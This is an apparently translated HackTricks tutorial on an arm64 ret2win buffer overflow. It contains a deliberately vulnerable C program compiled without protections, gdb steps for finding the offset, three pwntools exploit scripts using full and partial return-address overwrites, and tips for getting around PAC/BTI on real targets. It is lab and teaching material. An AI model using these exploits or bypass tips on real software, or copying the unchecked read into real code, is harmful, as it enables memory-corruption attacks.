# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

Vind 'n inleiding tot arm64 in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Kompileer sonder pie en canary:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie -mbranch-protection=none
```
- Die bykomende vlag `-mbranch-protection=none` skakel AArch64 Branch Protection (PAC/BTI) uit. As jou toolchain standaard PAC of BTI aktiveer, hou dit die laboratorium reproduseerbaar. Om te kontroleer of 'n saamgestelde binêre PAC/BTI gebruik, kan jy:
- Kyk na AArch64 GNU-eienskappe:
- `readelf --notes -W ret2win | grep -E 'AARCH64_FEATURE_1_(BTI|PAC)'`
- Inspekteer prologues/epilogues vir `paciasp`/`autiasp` (PAC) of vir `bti c` landing pads (BTI):
- `objdump -d ret2win | head -n 40`

### AArch64 oproepkonvensie — kort feite

- Die link register is `x30` (ook bekend as `lr`), en funksies stoor tipies `x29`/`x30` met `stp x29, x30, [sp, #-16]!` en herstel hulle met `ldp x29, x30, [sp], #16; ret`.
- Dit beteken die gestoor terugkeeradres lê by `sp+8` relatief tot die raambasis. Met 'n `char buffer[64]` onderin geplaas, is die gewone oorskryafstand tot die gestoor `x30` 64 (buffer) + 8 (gestoor x29) = 72 bytes — presies wat ons hieronder sal vind.
- Die stack pointer moet by funksiegrense 16‑byte gealigneer bly. As jy later ROP chains bou vir meer komplekse scenario's, behou die SP-alignment anders kan jy op funksie-epilogues vasloop.

## Bepaal die offset

### Patroon-opsie

Hierdie voorbeeld is geskep met [**GEF**](https://github.com/bata24/gef):

Begin gdb met gef, skep 'n patroon en gebruik dit:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 sal probeer terugkeer na die adres in die register x30 (wat gekompromitteer is), ons kan dit gebruik om die patroon-offset te vind:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**Die offset is 72 (9x48).**

### Stack offset opsie

Begin deur die stack-adres te kry waar die pc register gestoor is:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

Stel nou 'n breakpoint na die `read()` en gebruik continue totdat die `read()` uitgevoer word, en stel 'n patroon soos 13371337:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

Vind waar hierdie patroon in geheue gestoor is:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

Dan: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### Regulier

Kry die adres van die **`win`** funksie:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Exploit:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)
# Optional but nice for AArch64
context.arch = 'aarch64'

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

Eintlik gaan dit meer soos 'n off-by-2 wees in die PC wat in die stack gestoor is. In plaas daarvan om die hele return address te oorskryf, gaan ons **slegs die laaste 2 bytes** met `0x06c4` oorskryf.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

Jy kan nog 'n off-by-one voorbeeld in ARM64 vind by [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), wat 'n werklike off-by-**one** is in 'n fiktiewe kwetsbaarheid.

## Met PIE

> [!TIP]
> Kompileer die binary **sonder die `-no-pie` argument**

### Off-by-2

Sonder 'n leak weet ons nie die presiese address van die win function nie, maar ons kan die offset van die function binne die binary bepaal. Aangesien die return address wat ons overskryf reeds na 'n nabygeleë address wys, is dit moontlik om die offset na die win function (**0x7d4**) in hierdie geval te leak en net daardie offset te gebruik:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
### Aantekeninge oor moderne AArch64-hardening (PAC/BTI) en ret2win

- As die binary saamgestel is met AArch64 Branch Protection, kan jy `paciasp`/`autiasp` of `bti c` in funksie-prologues/epilogues sien. In daardie geval:
- Terugkeer na 'n adres wat nie 'n geldige BTI landing pad is nie, kan 'n `SIGILL` veroorsaak. Mik eerder op die presiese funksie-ingang wat `bti c` bevat.
- As PAC vir returns geaktiveer is, kan naïewe overwrite van return-adresse misluk omdat die epilogue `x30` autentikeer. Vir leerscenario's, herbou met `-mbranch-protection=none` (hierbo getoon). Wanneer jy regte teikens aanval, verkies nie-return kapings (bv. function pointer overwrites) of bou ROP wat nooit 'n `autiasp`/`ret` paar uitvoer wat jou vervalste LR autentikeer nie.
- Om kenmerke vinnig te kontroleer:
- `readelf --notes -W ./ret2win` en kyk vir `AARCH64_FEATURE_1_BTI` / `AARCH64_FEATURE_1_PAC` notas.
- `objdump -d ./ret2win | head -n 40` en kyk vir `bti c`, `paciasp`, `autiasp`.

### Running on non‑ARM64 hosts (qemu‑user quick tip)

If you are on x86_64 but want to practice AArch64:
```bash
# Install qemu-user and AArch64 libs (Debian/Ubuntu)
sudo apt-get install qemu-user qemu-user-static libc6-arm64-cross

# Run the binary with the AArch64 loader environment
qemu-aarch64 -L /usr/aarch64-linux-gnu ./ret2win

# Debug with GDB (qemu-user gdbstub)
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./ret2win &
# In another terminal
gdb-multiarch ./ret2win -ex 'target remote :1234'
```
### Verwante HackTricks-bladsye

-
{{#ref}}
../../rop-return-oriented-programing/rop-syscall-execv/ret2syscall-arm64.md
{{#endref}}
-
{{#ref}}
../../rop-return-oriented-programing/ret2lib/ret2lib-+-printf-leak-arm64.md
{{#endref}}



## Verwysings

- Aktivering van PAC en BTI op AArch64 vir Linux (Arm Community, Nov 2024). https://community.arm.com/arm-community-blogs/b/operating-systems-blog/posts/enabling-pac-and-bti-on-aarch64-for-linux
- Procedure-oproepstandaard vir die Arm 64-bit-argitektuur (AAPCS64). https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst
{{#include ../../../banners/hacktricks-training.md}}
